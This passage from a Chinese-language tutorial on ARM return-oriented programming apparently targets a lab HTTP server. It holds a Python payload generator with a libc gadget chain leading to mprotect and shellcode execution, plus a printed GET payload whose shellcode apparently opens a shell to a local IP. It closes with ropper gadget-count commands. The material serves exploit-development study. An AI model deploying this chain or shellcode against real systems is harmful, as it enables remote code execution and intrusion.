            sys.stdout.buffer.write(b)
        sys.stdout.flush()
        post_out()
        sys.stdout.flush()
    def out_human(data):
        pre_out()
        sys.stdout.flush()
        b = '['
        for d in data:
            b+='0x'+d[0].hex()+' = '+d[1]+'|'
        if shellcode != '':
            b += shellcode.hex()
        b += ']'
        print(b,end='')
        sys.stdout.flush()
        post_out()
        sys.stdout.flush()
    if args.human:
        fmt = '>I'
    overflow =  [
            shifter,
            # prepare BX LR slider, chaining with r3
            lib(0x00103251), # (1): 0x00103250 (0x00103251): pop {r3, r7, pc};
            lib(0x0000220f,'r3'), # (1 p1): prepare r3 for gadget (3) 0x0000220e (0x0000220f): pop {r0, r3, r4, r6, r7, pc};
            data(0x56565656,'r7'), # (1 p2): JUNK
            lib(0x0005c038,'pc'), # = (1 p3: ) (2): 0x0005c038: pop {lr}; bx r3;
            lib(0x000db435,'lr'), # = (2 p1): bx lr slide: 0x000db434 (0x000db435): pop {pc};
            # / prepare BX LR slider
            lib(0x00024cb4,'r0'), # (3 p1) (5:) and r0, r0, #1; bx lr;
            lib(0x00103251, 'r3'), # (3 p2) (7:) restore lr,
            data(0x54545454,'r4'), # (3 p3) # JUNK
            data(0xFFFFFFFF-0x29,'r6'), # (3 p4):  value for (4) gadget
            data(0x57575757,'r7'), # (3 p5)
            lib(0x00012f6f,'PC'), # (3 p6) (4:) adds r6, #0x31; bx r0;
            lib(0x0003ea84), # (5 p1 bx lr) (6:) mov r2, r6; blx r3;
            lib(0x00116b80), # (7: p1) (9:) 0x00116b80: pop {r1, pc};
            data(0x57575757), # (7 p2)
            lib(0x0005c038,'pc'), # = (7 p3: ) (8:) 0x0005c038: pop {lr}; bx r3; (2)
            lib(0x000db435,'lr'), # = (8 p1): bx lr slide: 0x000db434 (0x000db435): pop {pc};
            data(0xFFFFF001, 'r1'), #( 9 p1)
            lib(0x00103251), # (9 p2) (10:) 0x00103250 (0x00103251): pop {r3, r7, pc};
            lib(0x00103251,'r3'),  # (10 p1) (11:) 0x00103250 (0x00103251): pop {r3, r7, pc};
            data(0x56565656,'r7'), # (10 p2)
            lib(0x00107cb4, 'PC'), # (10 p3) add r0, sp, #4; blx r3;
            lib(0x00024e54, 'R3'), # (11 p1), (13:) #0x00024e54: and r0, r0, r1; bx lr;
            data(0x57575757,'r7'), # (11 p2)
            lib(0x0005c038,'pc'), # (11 p3: ) (12): 0x0005c038: pop {lr}; bx r3;
            lib(0x000db435,'lr'), # (12 p1): bx lr slide: 0x000db434 (0x000db435): pop {pc};
            lib(0x00116b80), # (13 p1) (14:) 0x00116b80: pop {r1, pc};
            data(0x10101010, 'r1'), # (14 P1)
            lib(0x000d22d0,'PC'), # (14 p2) mprotect
            lib(0x00034d1d,'PC') # blx sp
            ]
    if args.human:
        out_human(overflow)
    else:
        out(overflow)
## ROP链开发过程
我的流程目前如下：
  * 我一次只添加一个gadget。
  * 在将负载发送到易受攻击的进程之前，我附加了调试器。
  * 我设置新的gadget的方式是，PC将成为一些已知的东西，同样为寄存器。
  * 在我执行有效负载之后，我检查寄存器以检查gadget是否成功执行。
为了简化这个任务，我在脚本中添加了一个--human选项，它基本上打印了以下输出：
    [root@armbox ~]# python overflowgen-myhttpd.py  --human
    GET
    [0x41[...]1414141414141414141414141 = shifter|0xb6f5d251 = |0xb6e5c20f = r3|0x56565656 = r7|
    0xb6eb6038 = pc|0xb6f35435 = lr|0xb6e7ecb4 = r0|0xb6f5d251 = r3|0x54545454 = r4|0xffffffd6 = r6|
    0x57575757 = r7|0xb6e6cf6f = PC|0xb6e98a84 = |0xb6f70b80 = |0x57575757 = |0xb6eb6038 = pc|
    0xb6f35435 = lr|0xfffff001 = r1|0xb6f5d251 = |0xb6f5d251 = r3|0x56565656 = r7|0xb6f61cb4 = PC|
    0xb6e7ee54 = R3|0x57575757 = r7|0xb6eb6038 = pc|0xb6f35435 = lr|0xb6f70b80 =
    |0x10101010 = r1|0xb6f2c2d0 = PC|0xb6e8ed1d = PC|01308fe213ff2fe102200121921ac827513701df041c0aa14a701022023701df3f27201c491a01df201c012101df201c022101df04a052404940c2710b2701df02ff115cc0a8fa012f62696e2f736858] HTTP/1.1
添加gadget后，您可以人工打印负载并检查寄存器是否与计划值匹配。
### 一般的目标
请注意：并非所有寄存器都是相等的，至少在使用的libc上是这样。把东西移赋值到R0很容易。。。
    (ropper) dimi@dimi-lab ~/arm-rop % count=0; while [[ $count -le 12 ]]; do echo -n R$count": "; ropper --file libc-2.28.so --quality 1 --search "mov r$count,%" 2>/dev/null| grep ':' | wc -l; let count=count+1; done
    search mov R0, any
    R0: 88
    R1: 14
    R2: 7
    R3: 8
    R4: 1
    R5: 1
    R6: 2
    R7: 1
    R8: 0
    R9: 0
    R10: 0
    R11: 0
    R12: 0
...移动一些东西出去，也许不是这样：
    (ropper) dimi@dimi-lab ~/arm-rop % count=0; while [[ $count -le 12 ]]; do echo -n R$count": "; ropper --file libc-2.28.so --quality 1 --search "mov %, r$count" 2>/dev/null| grep ':' | wc -l; let count=count+1; done
    search mov any, R0
    R0: 0
    R1: 3
    R2: 6
    R3: 8
    R4: 13
    R5: 32
    R6: 25
    R7: 10
    R8: 8
    R9: 7
    R10: 5
    R11: 3
    R12: 4
这只是一个例子，而且只有arm（不是ARMTHUMB），尽管如此有趣。
另一个重要的观点是：你用你的值得到的寄存器越少越好。正如您前面看到的，您可能需要“堆栈绑定”的寄存器——特别是在创建线程的进程中，这些寄存器可能很少。
原文链接：